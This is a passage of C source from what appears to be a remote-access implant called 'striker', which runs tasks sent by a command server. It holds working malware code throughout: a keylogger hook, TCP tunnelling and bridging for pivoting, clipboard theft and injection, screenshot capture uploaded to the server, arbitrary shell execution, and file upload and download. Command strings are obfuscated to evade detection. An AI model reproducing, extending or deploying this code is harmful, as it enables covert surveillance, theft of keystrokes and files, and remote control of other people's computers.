      result = result ^ 0x8000;
    if (GetKeyState(VK_LSHIFT) & 0x8000) // Left shift key is held?
      result = result ^ 0x4000;
    if (GetKeyState(VK_RSHIFT) & 0x8000) // Right shift key is held?
      result = result ^ 0x4000;
    if (keymon_keystrokes != NULL && keymon_keystrokes_count < KEYMON_MAX_KEYSTROKES){
      #ifdef STRIKER_DEBUG
      printf("[+] keymon: caps: %d  shift: %d  val: %d\n", (result & 0x8000) != 0, (result & 0x4000) != 0, result & 0xff);
      #endif
      *(keymon_keystrokes + (sizeof(short) * keymon_keystrokes_count)) = result;
      keymon_keystrokes_count += 1;
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
  }
#endif

#ifdef IS_LINUX
  int tcp_connect(char *host, int port){

    int conn_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (conn_fd == -1)
      return -1;
    char *port_str = malloc(6);
    snprintf(port_str, 6, "%d", port);
    struct addrinfo *server_addr;
    if (getaddrinfo(host, port_str, NULL, &server_addr)){
      free(port_str);
      return -1;
    }
    int connected = 0;
    for (struct addrinfo *addr_ptr = server_addr; addr_ptr != NULL; addr_ptr = addr_ptr->ai_next){
      if (connect(conn_fd, addr_ptr->ai_addr, addr_ptr->ai_addrlen))
        continue;
      connected = 1;
      break;
    }
    freeaddrinfo(server_addr);
    free(port_str);
    return (connected ? conn_fd : -1);
  }
#else
  SOCKET tcp_connect(char *host, int port){

    char *port_str = malloc(6);
    snprintf(port_str, 6, "%d", port);
    SOCKET conn = INVALID_SOCKET;
    struct addrinfo *server_addr = NULL, hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    int iResult = getaddrinfo(host, port_str, &hints, &server_addr);
    if (iResult != 0){
      free(port_str);
      return INVALID_SOCKET;
    }
    for (struct addrinfo *addr_ptr = server_addr; addr_ptr != NULL; addr_ptr = addr_ptr->ai_next) {
      conn = socket(addr_ptr->ai_family, addr_ptr->ai_socktype, 
        addr_ptr->ai_protocol);
      if (conn == INVALID_SOCKET)
        break;
      iResult = connect(conn, addr_ptr->ai_addr, (int)addr_ptr->ai_addrlen);
      if (iResult == SOCKET_ERROR) {
        closesocket(conn);
        conn = INVALID_SOCKET;
        continue;
      }
    }
    freeaddrinfo(server_addr);
    free(port_str);
    return conn;
  }
#endif


int tcp_tunnel(session *striker, task *tsk, char *lhost, int lport, char *rhost, int rport){

  char *lport_str = malloc(6);
  snprintf(lport_str, 6, "%d", lport);
  #ifdef IS_LINUX
    // Setup the socket server.
    int sock_fd, conn_fd;
    struct addrinfo *server_addr, client_addr;
    sock_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (sock_fd == -1){
      free(lport_str);
      return 1;
    }
    if (getaddrinfo(lhost, lport_str, NULL, &server_addr)){
      free(lport_str);
      return 1;
    }
    if (bind(sock_fd, server_addr->ai_addr, server_addr->ai_addrlen)){
      free(lport_str);
      freeaddrinfo(server_addr);
      return 1;
    }
    freeaddrinfo(server_addr);
    if (listen(sock_fd, 10)){
      free(lport_str); free(lport_str);
      return 1;
    }
    int client_addr_len = sizeof(client_addr);
    fd_set set;
    struct timeval timeout;
    pthread_t tid;
    // Main listener loop.
    while (!(striker->abort || tsk->abort)){
      timeout.tv_sec = 1; // 1 sec timeout for accepting new conns
      timeout.tv_usec = 0;
      FD_ZERO(&set);
      FD_SET(sock_fd, &set);
      int status = select(sock_fd + 1, &set, NULL, NULL, &timeout);
      if (status == -1)
        break;
      if (!status) // No connection queued
        continue;
      // Accept a new connection and create a thread for it
      conn_fd = accept(sock_fd, (struct sockaddr *)&client_addr, (socklen_t *)&client_addr_len);
      if (conn_fd == -1)
        break;
      queue *args = queue_init(5);
      queue_put(args, striker);
      queue_put(args, tsk);
      queue_put(args, rhost);
      queue_put(args, &rport);
      queue_put(args, &conn_fd);
      if (pthread_create(&tid, NULL, tcp_tunnel_route, (void *)args)){
        queue_free(args, 0);
        close(conn_fd);
      }
    }
    close(sock_fd);
  #else
    // Setup winsocks
    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) {
      return 1;
    }
    // Create the listening socket
    SOCKET listen_sock = INVALID_SOCKET;
    struct addrinfo *socket_addr = NULL, hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;
    iResult = getaddrinfo(lhost, lport_str, &hints, &socket_addr);
    if ( iResult != 0 ) {
      free(lport_str);
      WSACleanup();
      return 1;
    }
    listen_sock = socket(socket_addr->ai_family, socket_addr->ai_socktype, socket_addr->ai_protocol);
    if (listen_sock == INVALID_SOCKET){
      freeaddrinfo(socket_addr);
      free(lport_str);
      WSACleanup();
      return 1;
    }
    u_long iMode = 1;
    ioctlsocket(listen_sock, FIONBIO, &iMode); // Disable blocking
    // Start the listener
    iResult = bind(listen_sock, socket_addr->ai_addr, (int)socket_addr->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
      freeaddrinfo(socket_addr);
      closesocket(listen_sock);
      free(lport_str);
      WSACleanup();
      return 1;
    }
    freeaddrinfo(socket_addr);
    iResult = listen(listen_sock, SOMAXCONN);
    if (iResult == SOCKET_ERROR) {
      closesocket(listen_sock);
      free(lport_str);
      WSACleanup();
      return 1;
    }

    queue *conns = queue_init(100); // For active connections
    int block_size = 1204 * 50;
    char *buffer = malloc(block_size);
    SOCKET *client_sock = malloc(sizeof(SOCKET));
    SOCKET *server_sock = malloc(sizeof(SOCKET));

    while (!(striker->abort || tsk->abort)){ // The main loop.
      // Accept a new connection, if any.
      *client_sock = accept(listen_sock, NULL, NULL);
      if (*client_sock == INVALID_SOCKET) {
        if (WSAGetLastError() != WSAEWOULDBLOCK)
          break;
        goto tunnel_data;
      }
      if (queue_full(conns)){ // No space. Kill the socket till an active connection is closed.
        closesocket(*client_sock);
        goto tunnel_data;
      }
      // Connect to the remote host.
      *server_sock = tcp_connect(rhost, rport);
      if (*server_sock == INVALID_SOCKET){ // Connection failed.
        closesocket(*client_sock);
      }else{ // Successful connection. Update the connections queue.
        queue *sock_data = queue_init(2);
        u_long iMode = 1;
        ioctlsocket(*client_sock, FIONBIO, &iMode);
        ioctlsocket(*server_sock, FIONBIO, &iMode);
        queue_put(sock_data, client_sock);
        queue_put(sock_data, server_sock);
        queue_put(conns, sock_data);
        client_sock = malloc(sizeof(SOCKET));
        server_sock = malloc(sizeof(SOCKET));
      }

      tunnel_data:
        // Sweep through active connections, and route some data for each.
        queue_seek(conns, 0);
        while (!queue_exhausted(conns)){
          queue *sock_data = queue_get(conns);
          queue_seek(sock_data, 0);
          SOCKET *sock1 = queue_get(sock_data);
          SOCKET *sock2 = queue_get(sock_data);
          iResult = recv(*sock1, buffer, block_size, 0);
          if (iResult == SOCKET_ERROR){
            if (WSAGetLastError() != WSAEWOULDBLOCK)
              goto delete_sock;
          }else{
            if (iResult == 0)
              goto delete_sock;
            send(*sock2, buffer, iResult, 0);
          }
          iResult = recv(*sock2, buffer, block_size, 0);
          if (iResult == SOCKET_ERROR){
            if (WSAGetLastError() != WSAEWOULDBLOCK)
              goto delete_sock;
          }else{
            if (iResult == 0)
              goto delete_sock;
            send(*sock1, buffer, iResult, 0);
          }
          continue;
          // This block runs when the current route being processed need to be shutdown.
          delete_sock:
            closesocket(*sock1); closesocket(*sock2);
            free(sock1); free(sock2);
            queue_remove(conns, conns->pos - 1);
            queue_seek(conns, conns->pos - 1);
            queue_free(sock_data, 0);
        }
      Sleep(10); // A little delay
    }

    // Cleanup
    queue_seek(conns, 0);
    while (!queue_exhausted(conns)){
      client_sock = queue_get(conns);
      closesocket(*client_sock);
    }
    queue_free(conns, 0);
    closesocket(listen_sock);
    free(client_sock); free(server_sock);
    free(buffer);
    WSACleanup();
  #endif
  free(lport_str);
  return 0;
}

#ifdef IS_LINUX
  void *tcp_tunnel_route(void *ptr){

    pthread_detach(pthread_self());
    queue *args = (queue *)ptr;
    session *striker = queue_get(args);
    task *tsk = queue_get(args);
    char *rhost = queue_get(args);
    int rport = *((int *)queue_get(args));
    int client_fd = *((int *)queue_get(args));
    queue_free(args, 0);
    int server_fd = tcp_connect(rhost, rport);
    if (server_fd == -1)
      pthread_exit(NULL);
    fd_set client_set, server_set;
    struct timeval timeout;
    int n = 0, status;
    size_t block_size = 1024 * 50;
    char *buffer = malloc(block_size);
    while (!(striker->abort || tsk->abort)){
      timeout.tv_sec = 0;
      timeout.tv_usec = 5000;
      FD_ZERO(&client_set);
      FD_SET(client_fd, &client_set);
      status = select(client_fd + 1, &client_set, NULL, NULL, &timeout);
      if (status == -1)
        break;
      if (status){
        n = read(client_fd, buffer, block_size);
        if (n == -1 || n == 0)
          break;
        write(server_fd, buffer, n);
      }
      timeout.tv_sec = 0;
      timeout.tv_usec = 5000;
      FD_ZERO(&server_set);
      FD_SET(server_fd, &server_set);
      status = select(server_fd + 1, &server_set, NULL, NULL, &timeout);
      if (status == -1)
        break;
      if (status){
        n = read(server_fd, buffer, block_size);
        if (n == -1 || n == 0)
          break;
        write(client_fd, buffer, n);
      }
    }
    close(server_fd);
    close(client_fd);
    free(buffer);
    pthread_exit(NULL);
  }
#endif

void tcp_bridge(session *striker, task *tsk, char *host1, int port1, char *host2, int port2){

  #ifdef IS_LINUX
    while (!(striker->abort || tsk->abort)){
      int conn1_fd = tcp_connect(host1, port1);
      if (conn1_fd == -1){
        sleep(TCP_BRIDGE_RECONNECT_DELAY);
        continue;
      }
      int conn2_fd = tcp_connect(host2, port2);
      if (conn2_fd == -1){
        close(conn1_fd);
        sleep(TCP_BRIDGE_RECONNECT_DELAY);
        continue;
      }
      int block_size = 1024 * 50;
      char *buffer = malloc(block_size);
      fd_set conn1_set, conn2_set;
      struct timeval timeout;
      int n = 0, status;
      while (!(striker->abort || tsk->abort)){
        timeout.tv_sec = 0;
        timeout.tv_usec = 5000;
        FD_ZERO(&conn1_set);
        FD_SET(conn1_fd, &conn1_set);
        status = select(conn1_fd + 1, &conn1_set, NULL, NULL, &timeout);
        if (status == -1)
          break;
        if (status){
          n = read(conn1_fd, buffer, block_size);
          if (n == -1 || n == 0)
            break;
          write(conn2_fd, buffer, n);
        }
        timeout.tv_sec = 0;
        timeout.tv_usec = 5000;
        FD_ZERO(&conn2_set);
        FD_SET(conn2_fd, &conn2_set);
        status = select(conn2_fd + 1, &conn2_set, NULL, NULL, &timeout);
        if (status == -1)
          break;
        if (status){
          n = read(conn2_fd, buffer, block_size);
          if (n == -1 || n == 0)
            break;
          write(conn1_fd, buffer, n);
        }
      }
      close(conn1_fd);
      close(conn2_fd);
      free(buffer);
    }
  #else
    while (!(striker->abort || tsk->abort)){
      SOCKET sock1 = tcp_connect(host1, port1);
      if (sock1 == INVALID_SOCKET){
        sleep(TCP_BRIDGE_RECONNECT_DELAY);
        continue;
      }
      SOCKET sock2 = tcp_connect(host2, port2);
      if (sock2 == INVALID_SOCKET){
        closesocket(sock1);
        sleep(TCP_BRIDGE_RECONNECT_DELAY);
        continue;
      }
      u_long iMode = 1;
      ioctlsocket(sock1, FIONBIO, &iMode);
      ioctlsocket(sock2, FIONBIO, &iMode);
      int block_size = 1024 * 50;
      char *buffer = malloc(block_size);
      int iResult;
      while (!(striker->abort || tsk->abort)){
        iResult = recv(sock1, buffer, block_size, 0);
        if (iResult == SOCKET_ERROR){
          if (WSAGetLastError() != WSAEWOULDBLOCK)
            break;
        }else{
          if (iResult == 0)
            break;
          send(sock2, buffer, iResult, 0);
        }
        iResult = recv(sock2, buffer, block_size, 0);
        if (iResult == SOCKET_ERROR){
          if (WSAGetLastError() != WSAEWOULDBLOCK)
            break;
        }else{
          if (iResult == 0)
            break;
          send(sock1, buffer, iResult, 0);
        }
        Sleep(5); // A 5 ms cooldown.
      }
      free(buffer);
      closesocket(sock1);
      closesocket(sock2);
    }
  #endif
}

int clipread(char *buff, size_t len){

  #ifdef IS_LINUX
    FILE *proc = popen("xclip -o 2>&1", "r");
    if (!proc)
      return 1;
    fgets(buff, len, proc);
    pclose(proc);
  #else
    if (!OpenClipboard(NULL))
      return 1;
    HANDLE hData = GetClipboardData(CF_TEXT);
    if (!hData)
      return 1;
    char *text = GlobalLock(hData);
    if (!text)
      return 1;
    size_t textLen = strlen(text);
    memcpy(buff, text, textLen > len ? len : textLen);
    GlobalUnlock(hData);
  #endif
  return 0;
}

int clipwrite(char *buff){
  
  #ifdef IS_LINUX
    char strs[][32] = {"[OBFS_ENC]cat ", "[OBFS_ENC]xclip -sel clip 2>&1"};
    char *cmd = malloc(30);
    snprintf(cmd, MAX_CLIPBOARD_SIZE - 1, "%s | %s", obfs_decode(strs[0]), obfs_decode(strs[1]));
    FILE *proc = popen(cmd, "w");
    free(cmd);
    if (!proc){
      return 1;
    }
    if (!fwrite(buff, 1, strlen(buff), proc)){
      pclose(proc);
      return 1;
    }
    pclose(proc);
  #else
    if (!OpenClipboard(NULL))
      return 1;
    HGLOBAL hGlob = GlobalAlloc(GMEM_MOVEABLE, strlen(buff) + 1);
    if (!hGlob)
      return 1;
    memcpy(GlobalLock(hGlob), buff, strlen(buff));
    GlobalUnlock(hGlob);
    EmptyClipboard();
    SetClipboardData(CF_TEXT, hGlob);
    CloseClipboard();
  #endif
  return 0;
}

// Source: https://stackoverflow.com/questions/3291167/how-can-i-take-a-screenshot-in-a-windows-application
FILE *screenshot(){
  
  FILE *fo = tmpfile();
  if (!fo)
    return NULL;
  #ifdef IS_WINDOWS
    int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int cx = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int cy = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    int width = cx - x;
    int height = cy - y;
    HDC dcScreen = GetDC(0);
    HDC dcTarget = CreateCompatibleDC(dcScreen);
    HBITMAP bmpTarget = CreateCompatibleBitmap(dcScreen, width, height);
    HGDIOBJ oldBmp = SelectObject(dcTarget, bmpTarget);
    BitBlt(dcTarget, 0, 0, cx, cy, dcScreen, x, y, SRCCOPY | CAPTUREBLT);
    SelectObject(dcTarget, oldBmp);
    bitmapToFile(bmpTarget, fo);
    DeleteDC(dcTarget);
    ReleaseDC(GetConsoleWindow(), dcScreen);
  #else
    // Coming soon...
    fclose(fo);
    fo = NULL;
  #endif
  return fo;
}

#ifdef IS_WINDOWS
  // Source: https://stackoverflow.com/questions/24720451/save-hbitmap-to-bmp-file-using-only-win32
  int bitmapToFile(HBITMAP hBitmap, FILE *wfo){
    
    HDC hDC;
    int iBits;
    WORD wBitCount;
    DWORD dwPaletteSize = 0, dwBmBitsSize = 0, dwDIBSize = 0;
    BITMAP Bitmap0;
    BITMAPFILEHEADER bmfHdr;
    BITMAPINFOHEADER bi;
    LPBITMAPINFOHEADER lpbi;
    HANDLE hDib, hPal, hOldPal2 = NULL;
    hDC = CreateDC(TEXT("DISPLAY"), NULL, NULL, NULL);
    iBits = GetDeviceCaps(hDC, BITSPIXEL) * GetDeviceCaps(hDC, PLANES);
    DeleteDC(hDC);
    if (iBits <= 1)
      wBitCount = 1;
    else if (iBits <= 4)
      wBitCount = 4;
    else if (iBits <= 8)
      wBitCount = 8;
    else
      wBitCount = 24;
    GetObject(hBitmap, sizeof(Bitmap0), (LPSTR)&Bitmap0);
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = Bitmap0.bmWidth;
    bi.biHeight = -Bitmap0.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = wBitCount;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrImportant = 0;
    bi.biClrUsed = 256;
    dwBmBitsSize = ((Bitmap0.bmWidth * wBitCount + 31) & ~31) / 8 * Bitmap0.bmHeight;
    hDib = GlobalAlloc(GHND, dwBmBitsSize + dwPaletteSize + sizeof(BITMAPINFOHEADER));
    lpbi = (LPBITMAPINFOHEADER)GlobalLock(hDib);
    *lpbi = bi;

    hPal = GetStockObject(DEFAULT_PALETTE);
    if (hPal){
      hDC = GetDC(NULL);
      hOldPal2 = SelectPalette(hDC, (HPALETTE)hPal, FALSE);
      RealizePalette(hDC);
    }
    GetDIBits(hDC, hBitmap, 0, (UINT)Bitmap0.bmHeight, (LPSTR)lpbi + sizeof(BITMAPINFOHEADER) + dwPaletteSize, (BITMAPINFO *)lpbi, DIB_RGB_COLORS);
    if (hOldPal2){
      SelectPalette(hDC, (HPALETTE)hOldPal2, TRUE);
      RealizePalette(hDC);
      ReleaseDC(NULL, hDC);
    }

    bmfHdr.bfType = 0x4D42;
    dwDIBSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwPaletteSize + dwBmBitsSize;
    bmfHdr.bfSize = dwDIBSize;
    bmfHdr.bfReserved1 = 0;
    bmfHdr.bfReserved2 = 0;
    bmfHdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER) + dwPaletteSize;
    fwrite((LPSTR)&bmfHdr, 1, sizeof(BITMAPFILEHEADER), wfo);
    fwrite((LPSTR)lpbi, 1, dwDIBSize, wfo);
    GlobalUnlock(hDib);
    GlobalFree(hDib);
    return 0;
  }
#endif

task *parse_task(cJSON *json){

  char strs[][20] = {"[OBFS_ENC]uid", "[OBFS_ENC]taskType", "[OBFS_ENC]data"};
  for (int i = 0; i < 3; i++)
    obfs_decode(strs[i]);
  task *t = malloc(sizeof(task));
  t->uid = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(json, strs[0]));
  t->type = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(json, strs[1]));
  t->data = cJSON_GetObjectItemCaseSensitive(json, strs[2]);
  t->completed = 0;
  t->successful = 0;
  t->abort = 0;
  t->result = cJSON_CreateObject();
  t->input_json = json;
  return t;
}

void free_task(task *tsk){
  
  cJSON_Delete(tsk->result);
  cJSON_Delete(tsk->input_json);
  free(tsk);
}

#ifdef IS_LINUX
void *task_executor(void *ptr)
#else
DWORD WINAPI task_executor(LPVOID ptr)
#endif
{
  #ifdef IS_LINUX
    pthread_detach(pthread_self());
  #endif
  task_wrapper *tskw = (task_wrapper *)ptr;
  session *striker = tskw->striker;
  task *tsk = tskw->tsk;
  #ifdef STRIKER_DEBUG
  printf("[*] Executing task: %s\n", tsk->uid);
  #endif
  cJSON *data = tsk->data;
  buffer *result_buff = create_buffer(0);
  char cmd_strs[][30] = {"[OBFS_ENC]system", "[OBFS_ENC]download", "[OBFS_ENC]upload", "[OBFS_ENC]keymon", "[OBFS_ENC]abort", "[OBFS_ENC]delay", "[OBFS_ENC]cd", "[OBFS_ENC]kill", "[OBFS_ENC]tunnel", "[OBFS_ENC]bridge", "[OBFS_ENC]webload", "[OBFS_ENC]clipread", "[OBFS_ENC]clipwrite", "[OBFS_ENC]screenshot", "[OBFS_ENC]kbdfile", "[OBFS_ENC]ipinfo"};
  for (int i = 0; i < 16; i++)
    obfs_decode(cmd_strs[i]);
  if (!strcmp(tsk->type, cmd_strs[0])){ // Run a shell command.
    char strs[][20] = {"[OBFS_ENC]cmd", "[OBFS_ENC]%s 2>&1"};
    for (int i = 0; i < 2; i++)
      obfs_decode(strs[i]);
    char *cmd = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, strs[0]));
    if (!cmd)
      goto complete;
    char *shell_cmd = malloc(sizeof(char) * 1024);
    snprintf(shell_cmd, sizeof(char) * 1024, strs[1], cmd);
    FILE *proc = popen(shell_cmd, "r");
    free(shell_cmd);
    if (!proc)
      goto complete;
    const short chunk_size = 1024;
    char *tmp = malloc(sizeof(char) * chunk_size);
    while (result_buff->used < MAX_RES_SIZE){
      if (fgets(tmp, chunk_size, proc) == NULL)
        break;
      append_buffer(result_buff, tmp, strlen(tmp));
    }
    free(tmp);
    pclose(proc);
    tsk->successful = 1;
  }else if (!strcmp(tsk->type, cmd_strs[1])){ // Upload a file to the server.
    char strs[][40] = {"[OBFS_ENC]file", "[OBFS_ENC]Error opening file!", "[OBFS_ENC]%s/agent/upload/%s/%s"};
    for (int i = 0; i < 3; i++)
      obfs_decode(strs[i]);
    char *filename = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, strs[0]));
    FILE *rfo = fopen(filename, "rb");
    if (!rfo){
      buffer_strcpy(result_buff, strs[1]);
      goto complete;
    }
    struct stat st;
    if (stat(filename, &st)){
      buffer_strcpy(result_buff, strs[1]);
      goto complete;
    }
    size_t file_size = st.st_size;
    char *url = malloc(URL_SIZE);
    if (snprintf(url, URL_SIZE, strs[2], BASE_URL, striker->uid, tsk->uid) < 0)
      abort();
    if (!upload_file(url, filename, file_size, rfo, result_buff))
      tsk->successful = 1;
    fclose(rfo);
    free(url);
  }else if (!strcmp(tsk->type, cmd_strs[2])){ // Download a file from the server.
    char strs[][50] = {"[OBFS_ENC]fileID", "[OBFS_ENC]name", "[OBFS_ENC]%s/agent/download/%s", "[OBFS_ENC]%s%s", "[OBFS_ENC]Error writing file: ", "[OBFS_ENC]File downloaded!", "[OBFS_ENC]Download failed!"};
    for (int i = 0; i < 7; i++)
      obfs_decode(strs[i]);
    char *fileID = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, strs[0]));
    char *name = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, strs[1]));
    char *url = malloc(URL_SIZE);
    if (snprintf(url, URL_SIZE, strs[2], BASE_URL, fileID) < 0)
      abort();
    FILE *wfo = fopen(name, "wb");
    if (wfo != NULL){
      if (!web_download(url, wfo)){
        buffer_strcpy(result_buff, strs[5]);
        tsk->successful = 1;
      }else{
        buffer_strcpy(result_buff, strs[6]);
      }
      fclose(wfo);
    }else{
      append_buffer(result_buff, strs[4], strlen(strs[4]));
      append_buffer(result_buff, name, strlen(name));
    }
    free(url);
  }else if (!strcmp(tsk->type, cmd_strs[3])){ // Start a keylogger.
    char msg[] = "[OBFS_ENC]keymon is already running!";
    if (keymon_active){
      buffer_strcpy(result_buff, obfs_decode(msg));
    }else{
      keymon(striker, tsk);
      tsk->successful = 1;      
    }
  }else if (!strcmp(tsk->type, cmd_strs[4])){ // Abort the session.
    char msg[] = "[OBFS_ENC]Session aborted!";
    buffer_strcpy(result_buff, obfs_decode(msg));
    tsk->successful = 1;
    striker->abort = 1;
  }else if (!strcmp(tsk->type, cmd_strs[5])){ // Update callback delay.
    char msg[] = "[OBFS_ENC]Callback delay updated!";
    striker->delay = cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(data, cmd_strs[5]));
    buffer_strcpy(result_buff, obfs_decode(msg));
    tsk->successful = 1;
  }else if (!strcmp(tsk->type, cmd_strs[6])){ // Change working directory
    char strs[][50] = {"[OBFS_ENC]Error changing working directory!", "[OBFS_ENC]dir"};
    if (chdir(cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[1]))))){
      buffer_strcpy(result_buff, obfs_decode(strs[0]));
    }else{
      char *new_dir = malloc(PATH_MAX);
      getcwd(new_dir, PATH_MAX);
      buffer_strcpy(result_buff, new_dir);
      free(new_dir);
      tsk->successful = 1;
    }
  }else if (!strcmp(tsk->type, cmd_strs[7])){ // Signal a running task to abort.
    char strs[][30] = {"[OBFS_ENC]uid", "[OBFS_ENC]Invalid task!", "[OBFS_ENC]Abort signal set!"};
    char *targetID = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[0])));
    for (int i = 0; i < striker->tasks->count; i++){
      task *t = striker->tasks->items[i];
      if (!strcmp(t->uid, targetID)){
        t->abort = 1;
        tsk->successful = 1;
        break;     
      }
    }
    buffer_strcpy(result_buff, (tsk->successful ? obfs_decode(strs[2]) : obfs_decode(strs[1])));
  }else if (!strcmp(tsk->type, cmd_strs[8])){ // Create a TCP tunnel.
    char strs[][34] = {"[OBFS_ENC]lhost", "[OBFS_ENC]lport", "[OBFS_ENC]rhost", "[OBFS_ENC]rport", "[OBFS_ENC]Error starting tunnel!", "[OBFS_ENC]Tunnel closed!"};
    char *lhost = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[0])));
    int lport = cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[1])));
    char *rhost = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[2])));
    int rport = cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[3])));
    if (tcp_tunnel(striker, tsk, lhost, lport, rhost, rport)){
      buffer_strcpy(result_buff, obfs_decode(strs[4]));
    }else{
      buffer_strcpy(result_buff, obfs_decode(strs[5]));
      tsk->successful = 1;
    }
  }else if (!strcmp(tsk->type, cmd_strs[9])){ // Create a TCP bridge
    char strs[][30] = {"[OBFS_ENC]host1", "[OBFS_ENC]port1", "[OBFS_ENC]host2", "[OBFS_ENC]port2", "[OBFS_ENC]Bridge closed!"};
    char *host1 = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[0])));
    int port1 = cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[1])));
    char *host2 = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[2])));
    int port2 = cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[3])));
    tcp_bridge(striker, tsk, host1, port1, host2, port2);
    buffer_strcpy(result_buff, obfs_decode(strs[4]));
    tsk->successful = 1;
  }else if (!strcmp(tsk->type, cmd_strs[10])){ // Download a file from a URL
    char strs[][30] = {"[OBFS_ENC]url", "[OBFS_ENC]file", "[OBFS_ENC]Error opening file!", "[OBFS_ENC]File downloaded!", "[OBFS_ENC]Download failed!"};
    char *url = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[0])));
    char *filename = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[1])));
    FILE *wfo = fopen(filename, "wb");
    if (!wfo){
      buffer_strcpy(result_buff, obfs_decode(strs[2]));
    }else{
      if (web_download(url, wfo))
        buffer_strcpy(result_buff, obfs_decode(strs[4]));
      else
        buffer_strcpy(result_buff, obfs_decode(strs[3]));
      fclose(wfo);
    }
  }else if (!strcmp(tsk->type, cmd_strs[11])){ // Read from clipboard
    char err[] = "[OBFS_ENC]Error reading clipboard!";
    char *buff = malloc(MAX_CLIPBOARD_SIZE + 1);
    if (clipread(buff, MAX_CLIPBOARD_SIZE)){
      buffer_strcpy(result_buff, obfs_decode(err));
    }else{
      buffer_strcpy(result_buff, buff);
      tsk->successful = 1;
    }
    free(buff);
  }else if (!strcmp(tsk->type, cmd_strs[12])){ // Write to clipboard
    char strs[][40] = {"[OBFS_ENC]Error writing to clipboard!", "[OBFS_ENC]Text written!"};
    char *text = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, "text"));
    if (clipwrite(text)){
      buffer_strcpy(result_buff, obfs_decode(strs[0]));
    }else{
      buffer_strcpy(result_buff, obfs_decode(strs[1]));
      tsk->successful = 1;
    }
  }else if (!strcmp(tsk->type, cmd_strs[13])){ // Take a screenshot
    char strs[][40] = {"[OBFS_ENC]Error taking screenshot!", "[OBFS_ENC]Error uploading screenshot!", "[OBFS_ENC]Screenshot captured!", "[OBFS_ENC]screenshot-", "[OBFS_ENC]%s/agent/upload/%s/%s"};
    FILE *fo = screenshot();
    if (!fo){
      buffer_strcpy(result_buff, obfs_decode(strs[0]));
      goto complete;
    }
    size_t file_size = ftell(fo);
    rewind(fo);
    char *filename = malloc(50);
    snprintf(filename, 50, "%s%ld.bmp", obfs_decode(strs[3]), (unsigned long)time(NULL));
    char *upload_url = malloc(1024);
    snprintf(upload_url, 1024, obfs_decode(strs[4]), BASE_URL, striker->uid, tsk->uid);
    if (upload_file(upload_url, filename, file_size, fo, result_buff)){
      buffer_strcpy(result_buff, obfs_decode(strs[1]));
    }else{
      buffer_strcpy(result_buff, obfs_decode(strs[2]));
      tsk->successful = 1;
    }
    free(upload_url);
    free(filename);
  }else if (!strcmp(tsk->type, cmd_strs[14])){
    #ifdef IS_LINUX
    strncpy(striker->kbd_event_file, cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, "file")), PATH_MAX - 1);
    tsk->successful = 1;
    #endif
  }else if (!strcmp(tsk->type, cmd_strs[15])){
    char strs[][36] = {"[OBFS_ENC]https://ipwho.is", "[OBFS_ENC]Error fetching data!"};
    tsk->successful = http_get(obfs_decode(strs[0]), result_buff) != 0;
    if (!tsk->successful)
      buffer_strcpy(result_buff, obfs_decode(strs[1]));
  }else{
    char msg[] = "[OBFS_ENC]Not implemented!";
    buffer_strcpy(result_buff, obfs_decode(msg));
  }

  complete: ; // GCC hates definitions directly after a block tag.
    char strs[][20] = {"[OBFS_ENC]uid", "[OBFS_ENC]result", "[OBFS_ENC]successful"};
    for (int i = 0; i < 3; i++)
      obfs_decode(strs[i]);
    #ifdef STRIKER_DEBUG
      printf("[+] Task completed: %s\n", tsk->uid);
    #endif
    // Tasks that prepared their results by themselves will set `completed` to true.
    if (!tsk->completed){
      char *res = buffer_to_string(result_buff);
      cJSON_AddItemToObject(tsk->result, strs[0], cJSON_CreateString(tsk->uid));
      cJSON_AddItemToObject(tsk->result, strs[1], cJSON_CreateString(res));
      cJSON_AddItemToObject(tsk->result, strs[2], cJSON_CreateNumber(tsk->successful));
      free(res);
      tsk->completed = 1;
    }
